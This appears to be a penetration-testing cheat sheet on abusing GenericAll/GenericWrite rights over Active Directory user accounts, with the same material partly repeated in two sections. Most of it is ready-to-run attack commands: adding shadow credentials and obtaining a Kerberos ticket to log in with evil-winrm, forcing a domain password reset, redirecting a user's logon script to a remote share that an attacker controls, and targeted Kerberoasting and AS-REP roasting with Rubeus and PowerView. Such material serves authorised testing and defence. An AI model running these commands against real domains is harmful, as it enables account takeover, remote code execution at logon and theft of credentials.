## GenericAll/GenericWrite permissions exploitation on Users [t-ad-acl-acl_users_generic_all]

GenericAll/GenericWrite allows to change user attributes. It can be used to change user`s password, to add "Key Credentials" to the attribute msDS-KeyCredentialLink (shadow credentials), or targeted Kerberoasting/AS-REP roasting.


### References:

* [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

###  Use any of the possible abuse methods




**option 1: pywhisker.py**

{% code overflow="wrap" %}
```bash
#Shadow credentials

#Create and add a certificate to the object`s msDS-KeyCredentialLink attribute
pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k

#Use the pfx file to get a TGT using gettgtpkinit.py
python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache

#Connect using any of tools supporting kerberos
KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user

```
{% endcode %}


**option 2: net user**

{% code overflow="wrap" %}
```bash
#change the user`s password
net user <username> <password> /domain

```
{% endcode %}


**option 3: powerview**

{% code overflow="wrap" %}
```bash
#Overwrite the logon script path
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"

```
{% endcode %}


**option 4: powerview**

{% code overflow="wrap" %}
```bash
#Targeted Kerberoasting

#Set SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}

#Get Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap

#Clean SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

```
{% endcode %}


**option 5: powerview**

{% code overflow="wrap" %}
```bash
#Targeted ASREPRoasting
#You could make the user ASREPRoastable by disabling preauthentication and then ASREProast it.

Set-DomainObject -Credential $creds -Identity <username> -XOR @{UserAccountControl=4194304}

```
{% endcode %}

## GenericAll/GenericWrite permissions exploitation on Users [t-ad-acl-acl_users_generic_write]

### Overview

GenericWrite allows to change user attributes. It can be used to add "Key Credentials" to the attribute msDS-KeyCredentialLink (shadow credentials), change the logon script, or targeted Kerberoasting/AS-REP roasting.


### References:

* [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

###  Use any of the possible abuse methods




**option 1: pywhisker.py**

{% code overflow="wrap" %}
```bash
#Shadow credentials

#Create and add a certificate to the object`s msDS-KeyCredentialLink attribute
pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k

#Use the pfx file to get a TGT using gettgtpkinit.py
python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache

#Connect using any of tools supporting kerberos
KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user

```
{% endcode %}


**option 2: powerview**

{% code overflow="wrap" %}
```bash
#Overwrite the logon script path
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"

```
{% endcode %}


**option 3: powerview**

{% code overflow="wrap" %}
```bash
#Targeted Kerberoasting
#Set SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}

#Get Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap

#Clean SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

```
{% endcode %}


**option 4: powerview**

{% code overflow="wrap" %}
```bash
#Targeted ASREPRoasting
#You could make the user ASREPRoastable by disabling preauthentication and then ASREProast it.

Set-DomainObject -Credential $creds -Identity <username> -XOR @{UserAccountControl=4194304}

```
{% endcode %}

